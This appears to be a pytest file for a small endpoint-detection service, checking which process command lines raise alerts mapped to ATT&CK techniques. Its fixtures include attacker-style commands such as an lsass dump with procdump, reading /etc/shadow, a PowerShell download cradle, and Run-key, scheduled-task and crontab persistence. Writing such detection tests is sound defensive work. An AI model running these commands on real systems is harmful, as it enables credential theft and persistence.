"""Positive/negative fixtures exercise ingest -> worker -> evidence API.

These are deterministic contracts, not a real-world false-positive estimate.
"""
from datetime import datetime, timedelta, timezone
from uuid import uuid4

import pytest

from app.worker import process_batch
from app.detection import DetectionPipeline
from app.detection.correlator import Correlator
from app.detection.rules_loader import load_rules


CASES = [
    ("ps_encoded", "powershell.exe", "powershell -enc AAA", "T1059.001"),
    ("pwsh_download", "pwsh.exe", "pwsh -c '(New-Object Net.WebClient).DownloadString(\"https://example.invalid\")'", "T1059.001"),
    ("run_key", "reg.exe", r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Demo /d calc.exe /f", "T1547.001"),
    ("runonce_quoted", "reg.exe", r'"C:\Windows\System32\reg.exe" add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Demo /d calc.exe', "T1547.001"),
    ("task_create", "schtasks.exe", "schtasks /create /tn Demo /tr calc.exe /sc onlogon", "T1053.005"),
    ("cron_install", "crontab", "crontab /tmp/demo.cron", "T1053.003"),
    ("cron_stdin", "crontab", "crontab -", "T1053.003"),
    ("lsass_dump", "procdump.exe", "procdump -ma lsass.exe output.dmp", "T1003"),
    ("shadow_read", "cat", "cat /etc/shadow", "T1003"),
    ("ps_normal", "powershell.exe", "powershell -NoProfile -ExecutionPolicy Bypass -File backup.ps1", None),
    ("python_enc", "python.exe", "python -enc AAA", None),
    ("editor_terms", "notepad.exe", "notepad lsass-procdump-notes.txt", None),
    ("procdump_help", "procdump.exe", "procdump -?", None),
    ("normal_dump", "procdump.exe", "procdump -ma notepad.exe out.dmp", None),
    ("task_query", "schtasks.exe", "schtasks /query", None),
    ("task_help", "schtasks.exe", "schtasks /create /?", None),
    ("run_help", "reg.exe", "reg add /?", None),
    ("run_query", "reg.exe", r"reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run", None),
    ("run_other_key", "reg.exe", r"reg add HKCU\Software\Demo /v X /d calc.exe", None),
    ("cron_list", "crontab", "crontab -l", None),
    ("cron_remove", "crontab", "crontab -r", None),
    ("cron_quoted_echo", "bash", "bash -c 'echo crontab -l'", None),
]


@pytest.mark.parametrize("label,name,command,technique", CASES, ids=[case[0] for case in CASES])
def test_single_event_contract(client, fake_redis, auth_headers, label, name, command, technique):
    key = client.post("/api/v1/agents/enroll", json={"enroll_token": "test-enroll-token",
                      "hostname": "CONTRACT-PC", "platform": "linux" if name in {"crontab", "cat"} else "windows"}).json()["api_key"]
    event = {"host": "CONTRACT-PC", "event_uid": str(uuid4()), "event_type": "process_create",
             "data": {"process_name": name, "command_line": command, "pid": 100, "ppid": 42}}
    assert client.post("/api/v1/ingest", headers={"X-API-Key": key},
                       json={"events": [event]}).json()["accepted"] == 1
    fields = fake_redis.streams["minisoc:events"][0]
    assert process_batch(DetectionPipeline(), [("1-0", fields)]) == ["1-0"]
    result = client.get("/api/v1/alerts", headers=auth_headers).json()
    assert result["total"] == (0 if technique is None else 1)
    if technique:
        alert = result["items"][0]
        assert alert["technique"] == technique
        assert alert["evidence"]["command_line"] == command
        assert alert["evidence"]["process_name"] == name
        assert alert["host"] == "CONTRACT-PC"


def test_discovery_attribution_requires_process_enumeration():
    correlator = Correlator(load_rules())
    for i, name in enumerate(["whoami.exe", "hostname.exe", "ipconfig.exe", "net.exe"]):
        event = {"host": "PC", "event_type": "process_create", "data": {"ppid": 42, "process_name": name}}
        assert not correlator.evaluate(event, now=i)
    event["data"]["process_name"] = "tasklist.exe"
    hits = correlator.evaluate(event, now=4)
    assert len(hits) == 1 and hits[0].rule.technique == "T1057"


def test_file_burst_rule_is_not_proof_of_encryption():
    pipeline = DetectionPipeline(enable_ransomware=True)
    start = datetime.now(timezone.utc)
    from app.detection import normalize
    drafts = []
    for i in range(12):
        event = normalize({"host": "PC", "timestamp": start + timedelta(seconds=i/10),
                           "event_type": "file_modify", "data": {
                               "file_path": f"C:/build/{i}.txt", "entropy": 4.2}})
        drafts.extend(pipeline.process(event, now=i/10))
    # Deliberately document the rule's known benign match; don't fake a low FPR.
    assert any(d.source == "rule" and d.technique == "T1486" for d in drafts)
    assert not any(d.source == "ransomware" for d in drafts)
